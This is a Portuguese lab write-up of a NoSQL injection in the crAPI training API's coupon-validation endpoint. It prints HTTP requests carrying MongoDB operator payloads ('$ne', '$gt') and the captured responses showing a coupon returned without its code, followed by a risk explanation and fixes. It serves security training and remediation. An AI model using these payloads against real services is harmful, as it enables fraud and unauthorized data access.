🇧🇷 Português · [🇺🇸 English](../en/vulnerabilities/09-nosql-injection.md)

# NoSQL Injection — Cupom grátis sem saber o código

**Categoria OWASP API Security Top 10 (2023):** Injeção — não é uma categoria isolada no Top 10 de 2023 (era `API8:2019 — Injection`); hoje se enquadra como entrada não validada / falha de implementação.
**Severidade (CVSS v3.1):** `Média · 5.4` — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`
**Desafio crAPI correspondente:** Challenge 12 — "find a way to get coupons for free without the code"

---

## 1. Resumo

O endpoint de validação de cupom monta uma consulta ao **MongoDB** diretamente a partir do campo `coupon_code` enviado pelo cliente. Em vez de uma string, o atacante envia um **operador do MongoDB** (ex.: `{"$ne": "x"}`), que faz a consulta casar qualquer documento e retornar um cupom válido — **sem conhecer nenhum código**.

## 2. Pré-condições

- Conta autenticada qualquer (com token válido).

## 3. Passo a passo da exploração

1. Um pedido legítimo envia o código como string:

```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: localhost:8888
Authorization: Bearer <token>
Content-Type: application/json

{ "coupon_code": "TRAC075" }
```

2. Troque a string por um **operador do MongoDB**. Como o valor é usado cru na query, o operador é interpretado pelo banco:

```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: localhost:8888
Authorization: Bearer <token>
Content-Type: application/json

{ "coupon_code": { "$ne": "x" } }
```

A query vira algo como `db.coupons.findOne({ coupon_code: { $ne: "x" } })`, que casa o primeiro cupom existente e o retorna.

## 4. Evidência

**Confirmado contra a instância local** — captura em [`evidencias/09-nosql-injection/captura.txt`](../../evidencias/09-nosql-injection/captura.txt).

```
1) coupon_code = "NAOEXISTE123" (string)   -> HTTP 500 / sem cupom
2) coupon_code = {"$ne":"x"}               -> HTTP 200
   {"coupon_code":"TRAC075","amount":"75","CreatedAt":"..."}
3) coupon_code = {"$gt":""}                -> HTTP 200  (mesmo cupom)
```

Com um operador no lugar da string, o servidor devolveu um cupom válido (`TRAC075`, 75 de crédito) **sem que o atacante soubesse o código**.

## 5. Por que é um risco

Permite obter benefícios (cupons/descontos) de forma fraudulenta e, dependendo da query, **extrair ou burlar dados** do banco. NoSQL injection é frequentemente subestimada por quem acha que "bancos NoSQL não têm injection" — mas montar consultas a partir de entrada não tipada/validada é tão perigoso quanto concatenar SQL.

## 6. Como corrigir

- **Validar o tipo** da entrada: `coupon_code` deve ser uma **string**, rejeitando objetos/operadores.
- Usar consultas parametrizadas / construtores de query que tratem a entrada como valor literal, nunca como fragmento de query.
- Aplicar um schema de validação (ex.: JSON Schema) na borda da API.

## 7. Referências

- [OWASP — Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [OWASP API Security Top 10 (2023)](https://owasp.org/API-Security/editions/2023/en/0x00-header/)
